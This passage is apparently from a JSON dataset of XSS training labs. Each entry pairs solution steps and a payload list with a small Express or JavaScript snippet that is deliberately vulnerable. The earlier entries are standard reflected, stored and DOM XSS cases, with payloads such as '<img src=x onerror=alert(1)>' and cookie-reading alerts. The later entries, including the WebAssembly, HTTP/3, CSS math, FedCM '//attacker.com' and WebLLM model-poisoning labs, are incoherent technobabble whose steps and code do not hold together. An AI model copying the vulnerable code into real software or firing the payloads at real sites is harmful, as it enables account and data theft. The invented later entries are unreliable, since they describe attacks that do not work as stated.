        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const history = []; app.get('/search', (req, res) => { const q = req.query.q || ''; history.push(q); res.send('Search stored'); }); app.get('/dashboard', (req, res) => { const result = history.map(q => `<div>${q}</div>`).join(''); res.send(`<html><body>${result}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Feedback Portal Stored XSS in Comment Field",
      "Lab Description": "The feedback page allows users to submit comments, which are stored and displayed without sanitization. The rendering uses innerHTML, introducing an XSS vector. To solve: Submit a script payload that executes on the feedback view page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /feedback and submit a comment with an XSS payload.",
        "View the stored comment at /view-feedback.",
        "Inspect DOM for innerHTML usage.",
        "Trigger payload to confirm execution.",
        "Confirm successful JavaScript execution in user context."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<svg/onload=alert('XSS')>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/feedback', (req, res) => { feedback.push(req.body.comment); res.redirect('/view-feedback'); }); app.get('/view-feedback', (req, res) => { const output = feedback.map(f => `<p>${f}</p>`).join(''); res.send(`<html><body>${output}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Internal Blog Platform Stored XSS in Article Title Field",
      "Lab Description": "The internal blog system allows staff to post articles with a title and content. The title is rendered directly inside an H1 tag using innerHTML on the article view page. No sanitization is performed. To solve: Submit an article with a script payload in the title that executes when viewed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access /submit and post a new article with an XSS payload in the title.",
        "Navigate to /article?id=1 to view the article.",
        "Inspect how the title is rendered in the DOM.",
        "Confirm innerHTML is used inside H1.",
        "Trigger alert from injected payload."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const articles = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit', (req, res) => { articles.push({ title: req.body.title, content: req.body.content }); res.redirect('/article?id=1'); }); app.get('/article', (req, res) => { const a = articles[0]; res.send(`<html><body><h1 id='title'></h1><div>${a.content}</div><script>document.getElementById('title').innerHTML = \"${a.title}\";</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Job Portal Reflected XSS in Search Query Parameter",
      "Lab Description": "The job search page reflects the 'q' parameter inside a JavaScript variable for displaying recent searches. The value is directly inserted inside a JS string using double quotes. To solve: Inject JavaScript that breaks out of the string context.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to /jobs?q= with test input.",
        "Inspect page source for script using 'q' value.",
        "Confirm reflection inside quoted string in JS block.",
        "Craft payload that breaks out of the quote context.",
        "Trigger alert in the browser."
      ],
      "payloads": [
        "\";alert('XSS');//",
        "';alert(1);//",
        "`;alert(document.cookie)//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/jobs', (req, res) => { const q = req.query.q || ''; res.send(`<html><head><script>var search = \"${q}\";</script></head><body></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "E-learning Portal Stored XSS in Forum Post Body",
      "Lab Description": "The forum feature stores user-submitted posts and displays them on the thread page using innerHTML. The post body is stored and rendered without any sanitization. To solve: Submit a post with a script payload that executes on viewing.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a new post via /forum-post with a malicious body.",
        "Navigate to /thread?id=1 to view it.",
        "Inspect the DOM and confirm innerHTML rendering.",
        "Trigger alert to confirm execution.",
        "Validate JavaScript runs in the page context."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const threads = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/forum-post', (req, res) => { threads.push(req.body.body); res.redirect('/thread?id=1'); }); app.get('/thread', (req, res) => { res.send(`<div id='post'></div><script>document.getElementById('post').innerHTML = \"${threads[0]}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Customer Support Ticket System Stored XSS in Ticket Subject",
      "Lab Description": "Support tickets store a subject and message. The subject is displayed inside an HTML header using innerHTML when the ticket is viewed. No filtering is applied. To solve: Submit a malicious subject and trigger XSS on the view page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a new ticket at /ticket with an XSS payload in the subject.",
        "Access /view-ticket?id=1 to trigger rendering.",
        "Inspect header rendering of subject.",
        "Confirm DOM uses innerHTML with unsanitized input.",
        "Trigger payload in browser."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const tickets = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/ticket', (req, res) => { tickets.push({ subject: req.body.subject, body: req.body.body }); res.redirect('/view-ticket?id=1'); }); app.get('/view-ticket', (req, res) => { const t = tickets[0]; res.send(`<h2 id='sub'></h2><p>${t.body}</p><script>document.getElementById('sub').innerHTML = \"${t.subject}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "News Aggregator DOM XSS via Source Parameter",
      "Lab Description": "The news aggregator site reflects the `source` query param in a JS template literal that updates the filter UI. No escaping is performed. To solve: Inject a payload that executes within the JS template context.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Visit /news?source= and inject test payload.",
        "Inspect JavaScript block where source is reflected.",
        "Confirm injection in a JS template literal.",
        "Craft payload using backticks to inject JS.",
        "Verify execution with alert popup."
      ],
      "payloads": [
        "`;alert('XSS')//",
        "${alert(document.cookie)}",
        "`-alert(1)-`"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/news', (req, res) => { const source = req.query.source || 'global'; res.send(`<html><head><script>let src = \"${source}\";</script></head><body>News</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Real Estate Listings Reflected XSS in Search Filter",
      "Lab Description": "The listings page includes a `location` parameter reflected inside an inline JavaScript assignment within a template literal. The application uses the parameter to highlight recent searches but does not sanitize input. To solve: Inject a payload that breaks out of the JS context and executes a script.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Go to /listings?location= and supply test payloads.",
        "Inspect JavaScript block for reflection of location param.",
        "Confirm injection is inside a template literal string.",
        "Craft payload using backticks or JS expressions.",
        "Trigger alert to confirm code execution."
      ],
      "payloads": [
        "`;alert('XSS')//",
        "${alert(1)}",
        "`-alert(document.cookie)-`"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/listings', (req, res) => { const location = req.query.location || 'anywhere'; res.send(`<html><head><script>const loc = \"${location}\";</script></head><body>Search</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Social Media Platform Stored XSS in Comment Field",
      "Lab Description": "User-submitted comments are stored and displayed beneath each post using innerHTML. No output sanitization is performed. This allows stored JavaScript payloads to execute for all users viewing the comment. To solve: Submit a malicious comment that triggers script execution when the post is viewed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a comment with an XSS payload using /comment.",
        "Access the post page at /post?id=1.",
        "Inspect how comments are rendered in DOM.",
        "Confirm innerHTML is used without escaping.",
        "Trigger alert when page loads."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/comment', (req, res) => { comments.push(req.body.text); res.redirect('/post?id=1'); }); app.get('/post', (req, res) => { res.send(`<div id='cmt'></div><script>document.getElementById('cmt').innerHTML = \"${comments[0]}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "E-Commerce Dashboard DOM XSS via Username in Dashboard Widget",
      "Lab Description": "The admin dashboard displays the logged-in user's name using `innerHTML` to personalize a widget. The name is set via a cookie and injected into the DOM without sanitization. To solve: Set a malicious cookie value that leads to code execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use a browser extension or JS to set a crafted cookie: username=<payload>.",
        "Visit /dashboard and observe DOM rendering.",
        "Check how username is reflected via innerHTML.",
        "Confirm script execution from payload.",
        "Trigger alert on widget load."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/dashboard', (req, res) => { const name = req.cookies.username || 'Guest'; res.send(`<div id='welcome'></div><script>document.getElementById('welcome').innerHTML = \"${name}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Helpdesk Application Reflected XSS in Ticket Filter Parameter",
      "Lab Description": "The helpdesk UI includes a search filter using the `status` query parameter. This value is reflected directly inside a JavaScript variable using quotes. The reflection is not escaped, allowing arbitrary JS execution. To solve: Craft a payload that breaks out of the quoted string.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /tickets?status= with payloads.",
        "View page source and inspect how `status` is reflected.",
        "Note injection inside quoted JS variable.",
        "Craft payload using closing quote and JS injection.",
        "Trigger alert to verify."
      ],
      "payloads": [
        "\";alert(1);//",
        "';alert('XSS');//",
        "\"-alert(document.domain)-\""
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/tickets', (req, res) => { const status = req.query.status || 'open'; res.send(`<html><script>var s = \"${status}\";</script><body>Tickets</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Online Learning System Stored XSS in Feedback Field",
      "Lab Description": "The course feedback form stores submitted content in memory and displays it using `innerHTML` in the review section. No sanitization or escaping is applied. To solve: Submit a malicious script in the feedback field that executes upon rendering.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit feedback at /submit-feedback with XSS payload.",
        "Access /reviews to view the rendered feedback.",
        "Inspect the DOM for innerHTML usage.",
        "Confirm payload executes when content is loaded.",
        "Trigger alert from malicious content."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-feedback', (req, res) => { feedback.push(req.body.text); res.redirect('/reviews'); }); app.get('/reviews', (req, res) => { res.send(`<div id='fb'></div><script>document.getElementById('fb').innerHTML = \"${feedback[0]}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Event Management Portal Reflected XSS in Search Field",
      "Lab Description": "The event search functionality uses a `query` parameter that is reflected inside a script block using double quotes. No input sanitization is applied before rendering, creating a JavaScript injection point. To solve: Inject a payload that breaks out of the quoted string and triggers script execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access /events?query= and try basic payloads.",
        "Check page source for how the value is used in JS.",
        "Identify injection inside quoted variable assignment.",
        "Craft payload using `\";payload//` syntax.",
        "Trigger alert to confirm successful XSS."
      ],
      "payloads": [
        "\";alert('XSS')//",
        "';alert(1);//",
        "\"-alert(document.cookie)-\""
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/events', (req, res) => { const query = req.query.query || ''; res.send(`<html><script>var q = \"${query}\";</script><body>Events</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Travel Booking Site Stored XSS in Destination Review",
      "Lab Description": "User-submitted reviews for destinations are stored and rendered using `innerHTML` without any sanitization. This allows persistent JavaScript code to execute for other users viewing the destination. To solve: Submit a review that contains executable JavaScript.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "POST a review at /submit-review with a script payload.",
        "Visit /destination?id=1 to view reviews.",
        "Inspect how the review is injected into the DOM.",
        "Confirm use of `innerHTML` for rendering.",
        "Check for alert execution upon page load."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(document.domain)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const reviews = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { reviews.push(req.body.text); res.redirect('/destination?id=1'); }); app.get('/destination', (req, res) => { res.send(`<div id='reviews'></div><script>document.getElementById('reviews').innerHTML = \"${reviews[0]}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Internal Admin Tool DOM XSS via URL Fragment Injection",
      "Lab Description": "The admin dashboard reads the hash value from `location.hash` and injects it into the DOM using `innerHTML`. The application does not sanitize or validate the hash value, making it exploitable through fragment-based DOM XSS. To solve: Craft a malicious hash payload that executes arbitrary JavaScript.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to /admin#<payload> in browser.",
        "Inspect how `location.hash` is used in JS.",
        "Verify `innerHTML` injection without sanitization.",
        "Craft payload like `<img src=x onerror=alert(1)>`.",
        "Ensure alert is triggered from hash content."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/admin', (req, res) => { res.send(`<div id='hash'></div><script>document.getElementById('hash').innerHTML = location.hash.slice(1);</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Community Forum Reflected XSS in Tag Parameter",
      "Lab Description": "The forum's post listing page reflects the `tag` query parameter inside an inline `<script>` tag. The value is embedded inside a template literal and used to highlight matching posts. Lack of escaping allows JavaScript injection. To solve: Inject a payload that executes JavaScript in this context.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Visit /posts?tag= with test payloads.",
        "Inspect script block for template literal injection.",
        "Craft payload using backticks and template escape.",
        "Trigger alert to confirm successful injection.",
        "Validate execution occurs inside `<script>` context."
      ],
      "payloads": [
        "`;alert('XSS')//",
        "${alert(1)}",
        "`-alert(document.domain)-`"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/posts', (req, res) => { const tag = req.query.tag || ''; res.send(`<html><head><script>let t = \"${tag}\";</script></head><body>Forum</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Survey Application Stored XSS in Name Field",
      "Lab Description": "Survey submissions store user names which are later displayed in a leaderboard using `innerHTML`. Since user input is stored and not sanitized, this leads to stored XSS for any viewer of the leaderboard. To solve: Submit a payload as the name that runs JavaScript upon viewing.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit name at /submit-survey with an XSS payload.",
        "Visit /leaderboard to view stored submissions.",
        "Inspect how the name is injected into the DOM.",
        "Confirm use of `innerHTML` without sanitization.",
        "Check if payload executes as stored content loads."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('Pwned')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const entries = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-survey', (req, res) => { entries.push(req.body.name); res.redirect('/leaderboard'); }); app.get('/leaderboard', (req, res) => { res.send(`<div id='names'></div><script>document.getElementById('names').innerHTML = \"${entries[0]}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Online Shop Reflected XSS in Discount Code Field",
      "Lab Description": "The discount code entered in the checkout page is reflected into an inline script using double quotes. No sanitization is applied, allowing attackers to inject JavaScript directly into the script context. To solve: Inject a payload that escapes the quote and executes a script.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /checkout?code= and observe reflection.",
        "View page source to confirm script context.",
        "Notice double quotes wrapping injected value.",
        "Craft payload using `\";alert(1)//` pattern.",
        "Confirm payload triggers JavaScript execution."
      ],
      "payloads": [
        "\";alert(1)//",
        "';alert(document.domain)//",
        "\"-alert('XSS')-\""
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/checkout', (req, res) => { const code = req.query.code || ''; res.send(`<html><script>var discount = \"${code}\";</script><body>Apply discount</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Issue Tracker Stored XSS in Comment Field",
      "Lab Description": "The issue tracking system allows users to post comments. These comments are displayed using `innerHTML` without escaping, leading to stored XSS. To solve: Submit a comment with an XSS payload and visit the issue page to trigger it.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "POST a comment at /submit-comment with an XSS payload.",
        "Visit /issue?id=1 to load stored comments.",
        "Inspect DOM to confirm use of `innerHTML`.",
        "Check payload rendering in the page source.",
        "Verify script execution on page load."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(document.cookie)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-comment', (req, res) => { comments.push(req.body.text); res.redirect('/issue?id=1'); }); app.get('/issue', (req, res) => { res.send(`<div id='comments'></div><script>document.getElementById('comments').innerHTML = \"${comments[0]}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Fitness App Reflected XSS in Progress Tracker Filter",
      "Lab Description": "The `filter` parameter is used in the client-side chart script. It is inserted unescaped inside a JavaScript variable. The application lacks validation or escaping, making it vulnerable to reflected XSS. To solve: Inject a payload that escapes the JS context and executes code.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open /progress?filter= with test payloads.",
        "Inspect how value is used inside `<script>`.",
        "Observe JS variable assignment from filter param.",
        "Inject using backtick or quote-breaking syntax.",
        "Trigger alert to confirm XSS."
      ],
      "payloads": [
        "`;alert('XSS')//",
        "\";alert(1)//",
        "${alert(document.domain)}"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/progress', (req, res) => { const filter = req.query.filter || ''; res.send(`<html><head><script>var f = \"${filter}\";</script></head><body>Progress</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Restaurant Review Portal Stored XSS in Feedback Message",
      "Lab Description": "Users can leave feedback messages that are rendered on the homepage using `innerHTML`. The feedback is saved and shown to all visitors without sanitization. To solve: Submit a feedback message containing a script payload to trigger stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit feedback at /feedback with script payload.",
        "Visit homepage / to see stored feedback.",
        "Inspect rendering inside the HTML source.",
        "Verify `innerHTML` is used to display feedback.",
        "Ensure payload execution when page loads."
      ],
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('X')>",
        "<svg/onload=alert(document.domain)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/feedback', (req, res) => { feedback.push(req.body.message); res.redirect('/'); }); app.get('/', (req, res) => { res.send(`<div id='fb'></div><script>document.getElementById('fb').innerHTML = \"${feedback[0]}\";</script>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Online Learning Platform Reflected XSS in Course Title Preview",
      "Lab Description": "The preview page reflects the `title` parameter directly into a JavaScript variable in an inline script tag. This parameter is not encoded or escaped, creating a JS context injection vulnerability. To solve: Inject a payload that breaks out of the string and executes JavaScript.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Access /preview?title= with a test value.",
        "Inspect `<script>` block to confirm JS context injection.",
        "Note that title is reflected inside double quotes.",
        "Inject with a quote-breaking XSS payload.",
        "Verify alert execution after injection."
      ],
      "payloads": [
        "\";alert('XSS')//",
        "';alert(1);//",
        "`;alert(document.domain)//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/preview', (req, res) => { const title = req.query.title || ''; res.send(`<html><script>var courseTitle = \"${title}\";</script><body>Preview</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "WebAssembly GC XSS in Blockchain Smart Contract Debugger",
      "Lab Description": "Solidity IDE visualizes contract memory with WebAssembly GC type mismatches. The application renders garbage-collected heap data via innerHTML without validation. To solve: Corrupt GC references to inject HTML through malformed type arrays.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Compile malicious contract with wasm-gc toolchain",
        "Craft payload: (type $XSS (struct (field (mut (ref null $XSS))))",
        "Bypass type validation via recursive struct definitions",
        "Chain with multi-memory proposals",
        "Verify through Etherscan-like debugger"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "new Array(1024).fill('\\u003Cscript\\u003Ealert(1)')",
        "externref.fromJSValue(document.body)"
      ],
      "srcCode": "const instance = await WebAssembly.instantiate(gcWasm);\ndocument.getElementById('heap').innerHTML = \n  JSON.stringify(instance.exports.memory); // Vulnerable"
    },
    {
      "Lab scenario": "HTTP/3 Extended CONNECT XSS in IoT Over-the-Air Updates",
      "Lab Description": "Smart device manager uses HTTP/3 Extended CONNECT for firmware patches with reflection in admin UI. The application processes CONNECT-UDP handshakes via unescaped console.log(). To solve: Inject XSS through crafted :protocol pseudo-headers.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft CONNECT-UDP request with ngtcp2",
        "Inject payload: :protocol: </script><svg/onload=alert(1)>",
        "Bypass QPACK encoding using literal headers",
        "Automate with curl --http3-prior-knowledge",
        "Verify through device management portal"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "GET / HTTP/3\n:protocol: javascript:alert(1)\n\n",
        "priority: u=3, i=\";<script>alert(1)</script>\""
      ],
      "srcCode": "app.use((req, res) => {\n  console.log(`Protocol: ${req.headers[':protocol']}`); // Vulnerable\n});"
    },
    {
      "Lab scenario": "CSS Math Function XSS in Financial Forecasting Dashboard",
      "Lab Description": "Stock prediction tool implements CSS calc() with unsafe var(--user-input) handling. The application allows mathematical expressions in CSSOM via insertRule(). To solve: Break style context through trigonometric function abuse.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify CSS injection via Computed Styles panel",
        "Craft payload: --x: cos(</style><script>alert(1)</script>);",
        "Bypass sanitizer using env(safe-area-inset-*)",
        "Chain with @property registered custom properties",
        "Verify through PDF report generation"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "width: calc(var(--x) * 1px + </style><svg/onload=alert(1)>);",
        "@property --x { syntax: '<string>'; inherits: true; initial-value: \"\\3C script\\3E\" }"
      ],
      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userVars} }`); // Vulnerable"
    },
    {
      "Lab scenario": "WebNFC Tag Spoofing XSS in Retail Inventory System",
      "Lab Description": "Smart shelf system scans NFC tags with vulnerable NDEF record processing. The application renders product URLs via innerHTML without sanitization. To solve: Spoof NFC tags with javascript: payloads in NDEF Text records.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Program NFC tag using PN532 module",
        "Craft payload: NDEF Text: javascript:alert(document.domain)",
        "Bypass URL validation using UTF-16 encoding",
        "Automate with WebNFC polyfill",
        "Verify through mobile PWA interface"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "{\"records\":[{\"recordType\":\"text\",\"data\":\"javascript:alert(1)\"}]}",
        "nfc.write('javascript:/*%00*/alert(1)')"
      ],
      "srcCode": "navigator.nfc.watch((message) => {\n  document.getElementById('product').innerHTML = \n    message.records[0].data; // Vulnerable\n});"
    },
    {
      "Lab scenario": "SVG Animation Timeline XSS in Video Editing Suite",
      "Lab Description": "Non-linear editor implements SVG animations with unsafe begin/end attribute handling. The application uses document.timeline with user-controlled time values. To Solve: Trigger XSS through crafted beginElement() calls.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept animation keyframe data",
        "Craft payload: <animate begin='javascript:alert(1)'/>",
        "Bypass sanitizer using SMIL timing syntax",
        "Chain with requestAnimationFrame() callbacks",
        "Verify through video preview rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<animate attributeName='href' values='javascript:alert(1)' begin='1s'/>",
        "<set attributeName='xlink:href' to='javascript:alert(1)'/>"
      ],
      "srcCode": "document.timeline.play(new Animation(\n  new KeyframeEffect(svgElement, userKeyframes) // Vulnerable\n));"
    },
    {
      "Lab scenario": "XSS in WebLLM Chat Interface via Model Poisoning",
      "Lab Description": "AI chat platform uses WebLLM with unsafe tensor metadata handling. The application reflects model output tokens in DOM via innerHTML. To solve: Craft malicious LoRA adapter weights to force model output HTML payloads.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept model loading via Service Worker",
        "Inject payload: {\"embeddings\": [60, 115, 99, ...]} (ASCII for <script>)",
        "Bypass quantization checks using fp16 precision",
        "Automate with ONNX Runtime Web",
        "Verify through chat response rendering"
      ],
      "payloads": [
        "model_output = '<script>alert(1)</script>'",
        "tensor([[60,115,99],[114,105,112],[116,62]])"
      ],
      "srcCode": "const model = await WebLLM.loadModel(userUpload);\ndocument.body.innerHTML += model.generateResponse(prompt);"
    },
    {
      "Lab scenario": "CSS Animation Worklet XSS in Trading Platform",
      "Lab Description": "Stock charting tool implements Animation Worklet with unsafe input to workletGlobalScope. The application passes user-controlled parameters via registerAnimator(). To solve: Break JS execution context through worklet prototype pollution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify worklet registration via Sources panel",
        "Craft payload: class XSSAnimator { animate(currentTime, effect) { alert(1) } }",
        "Bypass CSP using worklet module loading",
        "Chain with AudioWorklet global scope",
        "Verify through candlestick chart rendering"
      ],
      "payloads": [
        "CSS.animationWorklet.addModule('data:text/javascript,alert(1)')",
        "registerAnimator('xss', class { constructor() { alert(1) } })"
      ],
      "srcCode": "await CSS.animationWorklet.addModule(`class XSS { ${userCode} }`);"
    },
    {
      "Lab scenario": "WebAssembly Exception Handling XSS in Code Sandbox",
      "Lab Description": "Online IDE implements Wasm exceptions with unsafe tag reflection. The application displays exception messages via textContent with CSS unescape. To solve: Abuse exception tag IDs to reconstruct script tags.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Compile Wasm with custom exception tags",
        "Craft payload: (exception $XSS (param i32) (i32.const 0x3C736372))",
        "Bypass tag validation using multi-memory",
        "Chain with garbage collection hooks",
        "Verify through debug console output"
      ],
      "payloads": [
        "throw new WebAssembly.Exception($XSS, [0x3C736372])",
        "catch ($XSS => String.fromCharCode(...args))"
      ],
      "srcCode": "try { instance.exports.run(); } catch (e) {\n  debugConsole.textContent = e; // Vulnerable CSS unescape\n}"
    },
    {
      "Lab scenario": "FedCM API XSS in Passwordless Auth Flow",
      "Lab Description": "WebAuthn alternative using FedCM reflects IDP responses in hidden iframes. The application processes asserted claims via postMessage without validation. To solve: Bypass same-origin policy via IDP origin spoofing.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Spoof IDP endpoint via DNS rebinding",
        "Craft payload: postMessage('<img/src=//xss>', '*')",
        "Bypass FedCM manifest checks using CNAME cloaking",
        "Automate with Puppeteer FedCM API",
        "Verify through OAuth callback"
      ],
      "payloads": [
        "IdentityProviderConfig: { clientId: '<script>' }",
        "navigator.credentials.get({ identity: { provider: '//attacker.com' } })"
      ],
      "srcCode": "const credential = await navigator.credentials.get({\n  identity: { provider: idpURL } // Vulnerable\n});"
    },
    {
      "Lab scenario": "SVG Font XSS in EPUB Reader",
      "Lab Description": "E-book reader renders custom fonts via SVG <textPath> without sanitization. The application allows @font-face rules from untrusted EPUBs. To solve: Achieve XSS through crafted SVG font glyph definitions.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create malicious EPUB using Sigil",
        "Inject payload: <font><glyph unicode='X' d='M0 0'/><hkern g1='X' g2='<script>'/>",
        "Bypass MIME validation using polyglot EPUB/ZIP",
        "Chain with CSS font-feature-settings",
        "Verify through reader's annotation system"
      ],
      "payloads": [
        "<textPath xlink:href='javascript:alert(1)'>",
        "@font-face { font-family:x; src:url('data:image/svg+xml,<svg/>...'); }"
      ],
      "srcCode": "epub.renderPage(content => {\n  readerDiv.innerHTML = content; // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebAssembly Component Model XSS in Data Processing Pipeline",
      "Lab Description": "Analytics platform processes WASM components with unsafe interface type reflection. The application renders component exports via innerHTML using JSON.stringify(). To solve: Inject HTML through malformed UTF-8 in component adapter strings.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Compile malicious component using wasm-tools",
        "Craft payload: (adapter utf8 \"\\x3Cscript>alert(1)</script>\")",
        "Bypass UTF-8 validation using WTF-8 encoding",
        "Chain with shared-nothing linking model",
        "Verify via component registry dashboard"
      ],
      "payloads": [
        "(component (export \"\\u{1F4AF}<script>\" (func)))",
        "data:application/wasm-component;base64,CmFkYXB0ZXIg..."
      ],
